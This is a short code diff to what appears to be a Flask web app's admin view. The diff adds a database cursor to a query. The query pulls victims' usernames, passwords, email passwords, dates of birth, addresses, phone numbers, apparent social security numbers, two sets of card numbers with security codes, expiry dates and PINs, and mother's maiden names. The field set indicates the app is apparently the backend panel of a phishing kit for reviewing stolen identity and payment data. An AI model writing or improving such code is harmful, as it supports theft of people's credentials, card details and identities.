@@ -122,6 +122,7 @@ def admin_login_page():
 def admin_page():
     if "admin_id" not in session:
        return redirect("/admin/login")
+    cursor = conn.cursor(dictionary=True)
     cursor.execute(
         """
         SELECT id, username, password, email, mail_pss, fullname, dob, street_address, state, zip_code, phone, sss, card_d, ccc, exp_date, sims, mmn, card_d2, ccc2, exp_date2, sims2
@@ -461,3 +462,4 @@ def verify_admin():
 if __name__ == "__main__":
 
     app.run()
+
